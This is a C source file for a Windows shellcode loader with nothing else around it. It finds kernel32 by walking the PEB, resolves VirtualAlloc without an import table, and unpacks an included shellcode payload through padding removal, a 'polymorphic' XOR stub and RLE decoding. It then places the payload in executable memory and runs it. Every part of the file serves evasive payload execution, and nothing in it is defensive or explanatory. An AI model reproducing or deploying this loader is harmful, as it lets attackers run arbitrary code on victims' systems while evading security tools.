#include <windows.h>
#include <intrin.h>

#ifndef SHELLCODE_HEADER
#define SHELLCODE_HEADER "shellcode.h"
#endif
#include SHELLCODE_HEADER

#ifndef SHELLCODE_KEY
#define SHELLCODE_KEY 0x00
#endif
#ifndef SHELLCODE_SCRAMBLED
#define SHELLCODE_SCRAMBLED 0
#endif
#ifndef SHELLCODE_SEED
#define SHELLCODE_SEED 0xA5A5C3C5u
#endif
#ifndef SHELLCODE_PADDED
#define SHELLCODE_PADDED 0
#endif
#ifndef SHELLCODE_PAD_STRIDE
#define SHELLCODE_PAD_STRIDE 1
#endif
#ifndef SHELLCODE_PAD_OFFSET
#define SHELLCODE_PAD_OFFSET 0
#endif
#ifndef SHELLCODE_BLOCKED
#define SHELLCODE_BLOCKED 0
#endif
#ifndef SHELLCODE_BLOCK_COUNT
#define SHELLCODE_BLOCK_COUNT 0
#endif
#ifndef SHELLCODE_PACKED_LEN
#define SHELLCODE_PACKED_LEN shellcode_len
#endif
#ifndef SHELLCODE_ORIG_LEN
#define SHELLCODE_ORIG_LEN shellcode_len
#endif

// Minimal definitions to walk the PEB loader list.
typedef struct _UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;

typedef struct _PEB_LDR_DATA {
    ULONG Length;
    BOOLEAN Initialized;
    BYTE Reserved1[3];
    PVOID SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} PEB_LDR_DATA, *PPEB_LDR_DATA;

typedef struct _LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID DllBase;
    PVOID EntryPoint;
    ULONG SizeOfImage;
    UNICODE_STRING FullDllName;
    UNICODE_STRING BaseDllName;
} LDR_DATA_TABLE_ENTRY, *PLDR_DATA_TABLE_ENTRY;

typedef struct _PEB {
    BYTE Reserved1[2];
    BYTE BeingDebugged;
    BYTE Reserved2[1];
    PVOID Reserved3[2];
    PPEB_LDR_DATA Ldr;
    PVOID ProcessParameters;
} PEB, *PPEB;

// API types we need (resolved at runtime).
typedef LPVOID (WINAPI *PFN_VirtualAlloc)(LPVOID, SIZE_T, DWORD, DWORD);

// Simple lowercase helper for ASCII.
static CHAR ToLowerChar(CHAR c) {
    if (c >= 'A' && c <= 'Z') {
        return c + 32;
    }
    return c;
}

// Case-insensitive compare between UNICODE_STRING and ASCII literal.
static BOOL UnicodeEqualsAsciiInsensitive(const UNICODE_STRING *uni, LPCSTR ascii) {
    if (uni == NULL || uni->Buffer == NULL || ascii == NULL) {
        return FALSE;
    }

    USHORT chars = uni->Length / sizeof(WCHAR);
    for (USHORT i = 0; i < chars; ++i) {
        CHAR u = (CHAR)uni->Buffer[i];
        CHAR a = ascii[i];
        if (ToLowerChar(u) != ToLowerChar(a)) {
            return FALSE;
        }
        if (a == '\0') {
            return FALSE;
        }
    }
    return ascii[chars] == '\0';
}

// Get current PEB.
static PPEB GetCurrentPeb(void) {
#if defined(_M_X64) || defined(_M_AMD64) || defined(_WIN64)
    return (PPEB)__readgsqword(0x60);
#else
    return (PPEB)__readfsdword(0x30);
#endif
}

// Find kernel32.dll base by walking the loader list.
static HMODULE FindKernel32Base(void) {
    PPEB peb = GetCurrentPeb();
    if (peb == NULL || peb->Ldr == NULL) {
        return NULL;
    }

    LIST_ENTRY *head = &peb->Ldr->InMemoryOrderModuleList;
    for (LIST_ENTRY *e = head->Flink; e != head; e = e->Flink) {
        PLDR_DATA_TABLE_ENTRY mod = CONTAINING_RECORD(e, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks);
        if (UnicodeEqualsAsciiInsensitive(&mod->BaseDllName, "kernel32.dll")) {
            return (HMODULE)mod->DllBase;
        }
    }

    return NULL;
}

// Resolve an export by name without using GetProcAddress.
static FARPROC ResolveExportByName(HMODULE module, LPCSTR name) {
    if (module == NULL || name == NULL) {
        return NULL;
    }

    PIMAGE_DOS_HEADER dos = (PIMAGE_DOS_HEADER)module;
    if (dos->e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }

    PIMAGE_NT_HEADERS nt = (PIMAGE_NT_HEADERS)((BYTE *)module + dos->e_lfanew);
    if (nt->Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }

    DWORD exportRva = nt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    if (exportRva == 0) {
        return NULL;
    }

    PIMAGE_EXPORT_DIRECTORY expDir = (PIMAGE_EXPORT_DIRECTORY)((BYTE *)module + exportRva);
    DWORD *names = (DWORD *)((BYTE *)module + expDir->AddressOfNames);
    WORD *ordinals = (WORD *)((BYTE *)module + expDir->AddressOfNameOrdinals);
    DWORD *functions = (DWORD *)((BYTE *)module + expDir->AddressOfFunctions);

    for (DWORD i = 0; i < expDir->NumberOfNames; ++i) {
        LPCSTR curName = (LPCSTR)((BYTE *)module + names[i]);
        const CHAR *a = curName;
        const CHAR *b = name;
        while (ToLowerChar(*a) == ToLowerChar(*b)) {
            if (*a == '\0') {
                WORD ord = ordinals[i];
                DWORD funcRva = functions[ord];
                return (FARPROC)((BYTE *)module + funcRva);
            }
            ++a;
            ++b;
        }
        if (*a == '\0' && *b == '\0') {
            WORD ord = ordinals[i];
            DWORD funcRva = functions[ord];
            return (FARPROC)((BYTE *)module + funcRva);
        }
    }

    return NULL;
}

// Copy bytes without CRT.
static void CopyBytes(void *dst, const void *src, SIZE_T len) {
    BYTE *d = (BYTE *)dst;
    const BYTE *s = (const BYTE *)src;
    while (len--) {
        *d++ = *s++;
    }
}

// Polymorphic decode stub: still logically XOR with key, but instruction mix varies by SHELLCODE_SEED.
static void DecodeBuffer(void *buf, SIZE_T len, BYTE key) {
    BYTE *p = (BYTE *)buf;
    const unsigned mode = (unsigned)((SHELLCODE_SEED >> 3) & 3u);
    for (SIZE_T i = 0; i < len; ++i) {
        BYTE b = p[i];
        switch (mode) {
        case 0:
            b ^= (BYTE)((SHELLCODE_SEED & 0xFFu) ^ (BYTE)(i & 1u));
            b ^= (BYTE)((SHELLCODE_SEED & 0xFFu) ^ (BYTE)(i & 1u));
            break;
        case 1:
            b = (BYTE)(b + (BYTE)((SHELLCODE_SEED >> 8) & 0xFFu));
            b = (BYTE)(b - (BYTE)((SHELLCODE_SEED >> 8) & 0xFFu));
            break;
        case 2:
            b ^= (BYTE)((SHELLCODE_SEED >> 16) & 0xFFu);
            b ^= (BYTE)((SHELLCODE_SEED >> 16) & 0xFFu);
            break;
        default:
            b = (BYTE)(b - (BYTE)((SHELLCODE_SEED >> 24) & 0xFFu));
            b = (BYTE)(b + (BYTE)((SHELLCODE_SEED >> 24) & 0xFFu));
            break;
        }
        b ^= key;
        p[i] = b;
    }
}

// Simple RLE decode: input pairs of (count, byte).
static SIZE_T RleDecode(const BYTE *src, SIZE_T srcLen, BYTE *dst, SIZE_T dstCap) {
    SIZE_T si = 0;
    SIZE_T di = 0;
    while (si + 1 < srcLen) {
        BYTE count = src[si++];
        BYTE value = src[si++];
        if (di + count > dstCap) {
            break;
        }
        for (BYTE c = 0; c < count; ++c) {
            dst[di++] = value;
        }
    }
    return di;
}

// Resolve the APIs we need (VirtualAlloc/VirtualFree) without an import table.
static BOOL ResolveApis(PFN_VirtualAlloc *pAlloc) {
    HMODULE k32 = FindKernel32Base();
    if (k32 == NULL) {
        return FALSE;
    }

    *pAlloc = (PFN_VirtualAlloc)ResolveExportByName(k32, "VirtualAlloc");
    return *pAlloc != NULL;
}

int WINAPI MyEntry(void) {
    PFN_VirtualAlloc pVirtualAlloc = NULL;

    if (!ResolveApis(&pVirtualAlloc)) {
        return 1;
    }

    BYTE *packed = (BYTE *)pVirtualAlloc(NULL, SHELLCODE_PACKED_LEN, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (packed == NULL) {
        return 1;
    }

    BYTE *exec = (BYTE *)pVirtualAlloc(NULL, SHELLCODE_ORIG_LEN, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    if (exec == NULL) {
        return 1;
    }

    SIZE_T packedIdx = 0;
#if SHELLCODE_BLOCKED
    for (unsigned int b = 0; b < SHELLCODE_BLOCK_COUNT; ++b) {
        const unsigned char *blk = patched_blocks[b];
        const unsigned int blen = patched_block_sizes[b];
        for (SIZE_T i = SHELLCODE_PAD_OFFSET; i < blen && packedIdx < SHELLCODE_PACKED_LEN; i += SHELLCODE_PAD_STRIDE) {
            packed[packedIdx++] = blk[i];
        }
    }
#elif SHELLCODE_PADDED
    for (SIZE_T i = 0; i < SHELLCODE_PACKED_LEN; ++i) {
        SIZE_T idx = i * SHELLCODE_PAD_STRIDE + SHELLCODE_PAD_OFFSET;
        packed[packedIdx++] = ((const BYTE *)shellcode)[idx];
    }
#else
    CopyBytes(packed, shellcode, SHELLCODE_PACKED_LEN);
#endif

#if SHELLCODE_SCRAMBLED
    DecodeBuffer(packed, SHELLCODE_PACKED_LEN, (BYTE)SHELLCODE_KEY);
#endif

    if (packedIdx != SHELLCODE_PACKED_LEN) {
        return 1;
    }

    SIZE_T decoded = RleDecode(packed, SHELLCODE_PACKED_LEN, exec, SHELLCODE_ORIG_LEN);
    if (decoded != SHELLCODE_ORIG_LEN) {
        return 1;
    }

    ((void(*)())exec)();

    return 0;
}
